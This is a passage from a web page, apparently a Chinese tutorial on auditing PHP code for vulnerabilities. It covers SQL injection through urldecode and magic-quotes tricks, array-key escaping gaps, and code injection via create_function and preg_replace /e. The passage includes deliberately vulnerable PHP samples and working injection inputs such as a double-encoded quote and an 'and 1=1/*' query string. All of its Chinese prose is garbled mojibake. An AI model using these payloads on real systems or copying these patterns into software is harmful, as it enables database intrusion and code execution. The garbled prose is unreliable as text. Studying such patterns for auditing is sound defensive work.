style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å­—ç¬¦<code>_</code>SERVER</td></tr></tbody></table><p><em>2) getenv()å¾—åˆ°çš„å˜é‡ï¼ˆä½¿ç”¨ç±»ä¼¼$<code>_</code>SERVERå˜é‡ï¼‰</em></p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥ï¼ˆgetenv()ï¼‰</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å­—ç¬¦getenv</td></tr></tbody></table><p><em>3) $HTTP_RAW_POST_DATAä¸PHPè¾“å…¥ã€è¾“å‡ºæµ</em></p><p>ä¸»è¦åº”ç”¨ä¸soap/xmlrpc/webpublishåŠŸèƒ½é‡Œï¼Œè¯·çœ‹å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>( $HTTP_RAW_POST_DATA ) ) &#123;</span><br><span class="line">$HTTP_RAW_POST_DATA = file_get_contents( <span class="string">'php://input'</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($HTTP_RAW_POST_DATA) )</span><br><span class="line">$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥ï¼ˆæ•°æ®æµï¼‰</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å­—ç¬¦HTTP_RAW_POST_DATAæˆ–è€…php://input</td></tr></tbody></table><p><em>4) æ•°æ®åº“æ“ä½œå®¹æ˜“å¿˜è®°â€™çš„åœ°æ–¹å¦‚ï¼šin()/limit/order by/group by</em></p><p>å¦‚Discuz!&lt;5.0çš„pm.phpï¼š<br>â€‹     </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($msgtobuddys)) &#123;</span><br><span class="line">$msgto = array_merge($msgtobuddys, <span class="keyword">array</span>($msgtoid));</span><br><span class="line">......</span><br><span class="line"><span class="keyword">foreach</span>($msgto <span class="keyword">as</span> $uid) &#123;</span><br><span class="line">$uids .= $comma.$uid;</span><br><span class="line">$comma = <span class="string">','</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">$query = $db-&gt;query(<span class="string">"SELECT m.username, mf.ignorepm FROM &#123;$tablepre&#125;members m</span></span><br><span class="line"><span class="string">LEFT JOIN &#123;$tablepre&#125;memberfields mf USING(uid)</span></span><br><span class="line"><span class="string">WHERE m.uid IN ($uids)"</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾æ•°æ®åº“æ“ä½œå­—ç¬¦ï¼ˆselect,update,insertç­‰ç­‰ï¼‰</td></tr></tbody></table><h3 id="å˜é‡çš„ç¼–ç ä¸è§£ç "><a href="#å˜é‡çš„ç¼–ç ä¸è§£ç " class="headerlink" title="å˜é‡çš„ç¼–ç ä¸è§£ç "></a>å˜é‡çš„ç¼–ç ä¸è§£ç </h3><p>ä¸€ä¸ªWEBç¨‹åºå¾ˆå¤šåŠŸèƒ½çš„å®ç°éƒ½éœ€è¦å˜é‡çš„ç¼–ç è§£ç ï¼Œè€Œä¸”å°±åœ¨è¿™ä¸€è½¬ä¸€è§£çš„ä¼ é€’è¿‡ç¨‹ä¸­å°±æ‚„æ‚„çš„ç»•è¿‡ä½ çš„è¿‡æ»¤çš„å®‰å…¨é˜²çº¿ã€‚</p><p>è¿™ä¸ªç±»å‹çš„ä¸»è¦å‡½æ•°æœ‰ï¼š</p><p><em>1) stripslashes() è¿™ä¸ªå…¶å®å°±æ˜¯ä¸€ä¸ªdecode-addslashes()</em></p><p><em>2) å…¶ä»–å­—ç¬¦ä¸²è½¬æ¢å‡½æ•°ï¼š</em></p><table><thead><tr><th style="text-align:left">å‡½æ•°</th><th style="text-align:left">è¯´æ˜</th></tr></thead><tbody><tr><td style="text-align:left">base64_decode</td><td style="text-align:left">å¯¹ä½¿ç”¨ MIME base64 ç¼–ç çš„æ•°æ®è¿›è¡Œè§£ç </td></tr><tr><td style="text-align:left">base64_encode</td><td style="text-align:left">ä½¿ç”¨ MIME base64 å¯¹æ•°æ®è¿›è¡Œç¼–ç </td></tr><tr><td style="text-align:left">rawurldecode</td><td style="text-align:left">å¯¹å·²ç¼–ç çš„ URL å­—ç¬¦ä¸²è¿›è¡Œè§£ç </td></tr><tr><td style="text-align:left">rawurlencode</td><td style="text-align:left">æŒ‰ç…§ RFC 1738 å¯¹ URL è¿›è¡Œç¼–ç </td></tr><tr><td style="text-align:left">urldecode</td><td style="text-align:left">è§£ç å·²ç¼–ç çš„ URL å­—ç¬¦ä¸²</td></tr><tr><td style="text-align:left">urlencode</td><td style="text-align:left">ç¼–ç  URL å­—ç¬¦ä¸²</td></tr></tbody></table><p><em>å¦å¤–ä¸€ä¸ª unserialize/serialize</em></p><p><em>3) å­—ç¬¦é›†å‡½æ•°ï¼ˆGKB,UTF7/8â€¦ï¼‰å¦‚iconv()/mb_convert_encoding()ç­‰</em></p><p>ç›®å‰å¾ˆå¤šæ¼æ´æŒ–æ˜è€…å¼€å§‹æ³¨æ„è¿™ä¸€ç±»å‹çš„æ¼æ´äº†ï¼Œå¦‚å…¸å‹çš„urldecodeï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM article WHERE articleid='"</span>.urldecode($_GET[id]).<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure><p>å½“magic_quotes_gpc=onæ—¶ï¼Œæˆ‘ä»¬æäº¤?id=%2527ï¼Œå¾—åˆ°sqlè¯­å¥ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM article WHERE articleid=<span class="string">''</span><span class="string">'</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å¯¹åº”çš„ç¼–ç å‡½æ•°</td></tr></tbody></table><h3 id="äºŒæ¬¡æ”»å‡»"><a href="#äºŒæ¬¡æ”»å‡»" class="headerlink" title="äºŒæ¬¡æ”»å‡»"></a>äºŒæ¬¡æ”»å‡»</h3><p><em>è¯¦ç»†è§é™„å½• [1]</em></p><p><em>1) æ•°æ®åº“å‡ºæ¥çš„å˜é‡æ²¡æœ‰è¿›è¡Œè¿‡æ»¤</em></p><p><em>2) æ•°æ®åº“çš„è½¬ä¹‰ç¬¦å·ï¼š</em></p><ul><li>mysql/oracleè½¬ä¹‰ç¬¦å·åŒæ ·æ˜¯\ï¼ˆæˆ‘ä»¬æäº¤â€™é€šè¿‡é­”æœ¯å¼•å·å˜åŒ–ä¸º\â€™ï¼Œå½“æˆ‘ä»¬updateè¿›å…¥æ•°æ®åº“æ—¶ï¼Œé€šè¿‡è½¬ä¹‰å˜ä¸ºâ€™ï¼‰</li><li>mssqlçš„è½¬ä¹‰å­—ç¬¦ä¸ºâ€™ï¼ˆæ‰€ä»¥æˆ‘ä»¬æäº¤â€™é€šè¿‡é­”æœ¯å¼•å·å˜åŒ–ä¸º\â€™ï¼Œmssqlä¼šæŠŠå®ƒå½“ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ç›´æ¥å¤„ç†ï¼Œæ‰€ä»¥é­”æœ¯å¼•å·å¯¹äºmssqlçš„æ³¨å°„æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼‰</li></ul><p>ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ€è€ƒå¾—åˆ°ä¸€ä¸ªç»“è®ºï¼šä¸€åˆ‡è¿›å…¥å‡½æ•°çš„å˜é‡éƒ½æ˜¯æœ‰å®³çš„ï¼Œå¦å¤–åˆ©ç”¨äºŒæ¬¡æ”»å‡»æˆ‘ä»¬å¯ä»¥å®ç°ä¸€ä¸ªwebrootkitï¼ŒæŠŠæˆ‘ä»¬çš„æ¶æ„æ„é€ ç›´æ¥æ”¾åˆ°æ•°æ®åº“é‡Œã€‚æˆ‘ä»¬åº”å½“æŠŠè¿™æ ·çš„ä»£ç çœ‹æˆä¸€ä¸ªvulï¼Ÿ</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šé€šè¯»ä»£ç </td></tr></tbody></table><h3 id="é­”æœ¯å¼•å·å¸¦æ¥çš„æ–°çš„å®‰å…¨é—®é¢˜"><a href="#é­”æœ¯å¼•å·å¸¦æ¥çš„æ–°çš„å®‰å…¨é—®é¢˜" class="headerlink" title="é­”æœ¯å¼•å·å¸¦æ¥çš„æ–°çš„å®‰å…¨é—®é¢˜"></a>é­”æœ¯å¼•å·å¸¦æ¥çš„æ–°çš„å®‰å…¨é—®é¢˜</h3><p>é¦–å…ˆæˆ‘ä»¬çœ‹ä¸‹é­”æœ¯å¼•å·çš„å¤„ç†æœºåˆ¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\--&gt;\\,&apos;--&gt;\&apos;,&quot;--&gt;\&quot;,null--&gt;\0]</span><br></pre></td></tr></table></figure><p>è¿™ç»™æˆ‘ä»¬å¼•è¿›äº†ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ç¬¦å·â€œ\â€ï¼Œâ€œ\â€ç¬¦å·ä¸ä»…ä»…æ˜¯è½¬ä¹‰ç¬¦å·ï¼Œåœ¨WINç³»ç»Ÿä¸‹ä¹Ÿæ˜¯ç›®å½•è½¬è·³çš„ç¬¦å·ã€‚è¿™ä¸ªç‰¹ç‚¹å¯èƒ½å¯¼è‡´phpåº”ç”¨ç¨‹åºé‡Œäº§ç”Ÿéå¸¸æœ‰æ„æ€çš„æ¼æ´ï¼š</p><p><em>1)å¾—åˆ°åŸå­—ç¬¦ï¼ˆâ€™,\,â€,null]ï¼‰</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æäº¤                 '</span></span><br><span class="line"><span class="comment">//é­”æœ¯å¼•å·å¤„ç†         \'</span></span><br><span class="line"><span class="comment">//substr               '</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</span><br><span class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</span><br><span class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</span><br><span class="line">   <span class="string">" WHERE order_sn = '$order_sn' LIMIT 1"</span>;</span><br></pre></td></tr></table></figure><p><em>2)å¾—åˆ°â€œ\â€å­—ç¬¦</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æäº¤                 '</span></span><br><span class="line"><span class="comment">//é­”æœ¯å¼•å·å¤„ç†         \'</span></span><br><span class="line"><span class="comment">//substr               \    </span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</span><br><span class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</span><br><span class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</span><br><span class="line">   <span class="string">" WHERE order_sn = '$order_sn' and order_tn='"</span>.$_GET[<span class="string">'order_tn'</span>].<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure><p>æäº¤å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order_sn=&apos;&amp;order_tn=%20and%201=1/*</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œçš„SQLè¯­å¥ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> order_id, order_status, shipping_status, pay_status, shipping_time, </span><br><span class="line">shipping_id, invoice_no, user_id <span class="keyword">FROM</span> order_info <span class="keyword">WHERE</span> order_sn = <span class="string">'\' and </span></span><br><span class="line"><span class="string">order_tn='</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">/*'</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å­—ç¬¦ä¸²å¤„ç†å‡½æ•°å¦‚substræˆ–è€…é€šè¯»ä»£ç </td></tr></tbody></table><h3 id="å˜é‡keyä¸é­”æœ¯å¼•å·"><a href="#å˜é‡keyä¸é­”æœ¯å¼•å·" class="headerlink" title="å˜é‡keyä¸é­”æœ¯å¼•å·"></a>å˜é‡keyä¸é­”æœ¯å¼•å·</h3><p>æˆ‘ä»¬æœ€åœ¨è¿™ä¸€èŠ‚çš„å¼€å¤´å°±æåˆ°äº†å˜é‡keyï¼ŒPHPçš„é­”æœ¯å¼•å·å¯¹å®ƒæœ‰ä»€ä¹ˆå½±å“å‘¢ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></span><br><span class="line"><span class="comment">//print_R($_GET); </span></span><br><span class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">print</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em>1)å½“magic_quotes_gpc = Onæ—¶ï¼Œåœ¨php5.24ä¸‹æµ‹è¯•æ˜¾ç¤ºï¼š</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa\<span class="string">'aaa</span></span><br><span class="line"><span class="string">bb\'b</span></span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢ç»“æœå¯ä»¥çœ‹å‡ºæ¥ï¼Œåœ¨è®¾ç½®äº†magic_quotes_gpc = Onä¸‹ï¼Œå˜é‡keyå—é­”æœ¯å¼•å·å½±å“ã€‚ä½†æ˜¯åœ¨php4å’Œphp&lt;5.2.1çš„ç‰ˆæœ¬ä¸­ï¼Œä¸å¤„ç†æ•°ç»„ç¬¬ä¸€ç»´å˜é‡çš„keyï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa[bb']=1 </span></span><br><span class="line">print_R($_GET); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¾ç¤º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [aaaa<span class="string">'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) )</span></span><br></pre></td></tr></table></figure><p>æ•°ç»„ç¬¬ä¸€ç»´å˜é‡çš„keyä¸å—é­”æœ¯å¼•å·çš„å½±å“ã€‚</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šphp4å’Œphp&lt;5.2.1</td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šé€šè¯»ä»£ç </td></tr></tbody></table><p><em>2)å½“magic_quotes_gpc = Offæ—¶ï¼Œåœ¨php5.24ä¸‹æµ‹è¯•æ˜¾ç¤ºï¼š</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa<span class="string">'aaa</span></span><br><span class="line"><span class="string">bb'</span>b</span><br></pre></td></tr></table></figure><p>å¯¹äºmagic_quotes_gpc = Offæ—¶æ‰€æœ‰çš„å˜é‡éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œè€ƒè™‘åˆ°è¿™ä¸ªï¼Œå¾ˆå¤šç¨‹åºéƒ½é€šè¿‡addslashesç­‰å‡½æ•°æ¥å®ç°é­”æœ¯å¼•å·å¯¹å˜é‡çš„è¿‡æ»¤ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//keyvul.php?aaa'aa=1'</span></span><br><span class="line"><span class="comment">//magic_quotes_gpc = Off</span></span><br><span class="line"> <span class="keyword">if</span> (!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line"> $_GET  = addslashes_array($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_array</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'addslashes_array'</span>, $value) : addslashes($value);</span><br><span class="line">&#125;</span><br><span class="line">print_R($_GET);</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šçš„ä»£ç çœ‹ä¸Šå»å¾ˆå®Œç¾ï¼Œä½†æ˜¯ä»–è¿™ä¸ªä»£ç é‡Œaddslashes($value)åªå¤„ç†äº†å˜é‡çš„å…·ä½“çš„å€¼ï¼Œä½†æ˜¯æ²¡æœ‰å¤„ç†å˜é‡æœ¬èº«çš„keyï¼Œä¸Šé¢çš„ä»£ç æ˜¾ç¤ºç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [aaa<span class="string">'aa] =&gt; 1\'</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">aaa'</span>aa</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šé€šè¯»ä»£ç </td></tr></tbody></table><h3 id="ä»£ç æ³¨å°„"><a href="#ä»£ç æ³¨å°„" class="headerlink" title="ä»£ç æ³¨å°„"></a>ä»£ç æ³¨å°„</h3><hr><h3 id="PHPä¸­å¯èƒ½å¯¼è‡´ä»£ç æ³¨å°„çš„å‡½æ•°"><a href="#PHPä¸­å¯èƒ½å¯¼è‡´ä»£ç æ³¨å°„çš„å‡½æ•°" class="headerlink" title="PHPä¸­å¯èƒ½å¯¼è‡´ä»£ç æ³¨å°„çš„å‡½æ•°"></a>PHPä¸­å¯èƒ½å¯¼è‡´ä»£ç æ³¨å°„çš„å‡½æ•°</h3><p>å¾ˆå¤šäººéƒ½çŸ¥é“evalã€preg_replace+/eå¯ä»¥æ‰§è¡Œä»£ç ï¼Œä½†æ˜¯ä¸çŸ¥é“phpè¿˜æœ‰å¾ˆå¤šçš„å‡½æ•°å¯ä»¥æ‰§è¡Œä»£ç å¦‚ï¼š</p><table><thead><tr><th style="text-align:left">å‡½æ•°</th></tr></thead><tbody><tr><td style="text-align:left">assert()</td></tr><tr><td style="text-align:left">call_user_func()</td></tr><tr><td style="text-align:left">call_user_func_array()</td></tr><tr><td style="text-align:left">create_function()</td></tr><tr><td style="text-align:left">å˜é‡å‡½æ•°</td></tr></tbody></table><p>è¿™é‡Œæˆ‘ä»¬çœ‹çœ‹æœ€è¿‘å‡ºç°çš„å‡ ä¸ªå…³äºcreate_function()ä»£ç æ‰§è¡Œæ¼æ´çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//how to exp this code</span></span><br><span class="line">$sort_by=$_GET[<span class="string">'sort_by'</span>];</span><br><span class="line">$sorter=<span class="string">'strnatcasecmp'</span>;</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">'test'</span>,<span class="string">'test'</span>);</span><br><span class="line">$sort_function = <span class="string">'  return 1 * '</span> . $sorter . <span class="string">'($a["'</span> . $sort_by . <span class="string">'"], $b["'</span> . $sort_by . <span class="string">'"]);</span></span><br><span class="line"><span class="string">      '</span>;</span><br><span class="line">usort($databases, create_function(<span class="string">'$a, $b'</span>, $sort_function));</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å¯¹åº”å‡½æ•°ï¼ˆassert,call_user_func,call_user_func_array,create_functionç­‰ï¼‰</td></tr></tbody></table><h3 id="å˜é‡å‡½æ•°ä¸åŒå¼•å·"><a href="#å˜é‡å‡½æ•°ä¸åŒå¼•å·" class="headerlink" title="å˜é‡å‡½æ•°ä¸åŒå¼•å·"></a>å˜é‡å‡½æ•°ä¸åŒå¼•å·</h3><p>å¯¹äºå•å¼•å·å’ŒåŒå¼•å·çš„åŒºåˆ«ï¼Œå¾ˆå¤šç¨‹åºå‘˜æ·±æœ‰ä½“ä¼šï¼Œç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"$a\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a\n'</span>;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å†çœ‹å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//how to exp this code</span></span><br><span class="line"><span class="keyword">if</span>($globals[<span class="string">'bbc_email'</span>])&#123;</span><br><span class="line"></span><br><span class="line">$text = preg_replace(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">"/\[email=(.*?)\](.*?)\[\/email\]/ies"</span>,</span><br><span class="line"><span class="string">"/\[email\](.*?)\[\/email\]/ies"</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">'check_email("$1", "$2")'</span>,</span><br><span class="line"><span class="string">'check_email("$1", "$1")'</span>), $text);</span><br></pre></td></tr></table></figure><p>å¦å¤–å¾ˆå¤šçš„åº”ç”¨ç¨‹åºéƒ½æŠŠå˜é‡ç”¨â€â€å­˜æ”¾åœ¨ç¼“å­˜æ–‡ä»¶æˆ–è€…configæˆ–è€…dataæ–‡ä»¶é‡Œï¼Œè¿™æ ·å¾ˆå®¹æ˜“è¢«äººæ³¨å°„å˜é‡å‡½æ•°ã€‚</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šé€šè¯»ä»£ç </td></tr></tbody></table><h3 id="PHPè‡ªèº«å‡½æ•°æ¼æ´åŠç¼ºé™·"><a href="#PHPè‡ªèº«å‡½æ•°æ¼æ´åŠç¼ºé™·" class="headerlink" title="PHPè‡ªèº«å‡½æ•°æ¼æ´åŠç¼ºé™·"></a>PHPè‡ªèº«å‡½æ•°æ¼æ´åŠç¼ºé™·</h3><hr><h3 id="PHPå‡½æ•°çš„æº¢å‡ºæ¼æ´"><a href="#PHPå‡½æ•°çš„æº¢å‡ºæ¼æ´" class="headerlink" title="PHPå‡½æ•°çš„æº¢å‡ºæ¼æ´"></a>PHPå‡½æ•°çš„æº¢å‡ºæ¼æ´</h3><p>å¤§å®¶è¿˜è®°å¾—Stefan Esserå¤§ç‰›çš„Month of PHP Bugsï¼ˆMOPBè§é™„å½• [2]ï¼‰é¡¹ç›®ä¹ˆï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰åçš„è¦ç®—æ˜¯unserialize()ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . <span 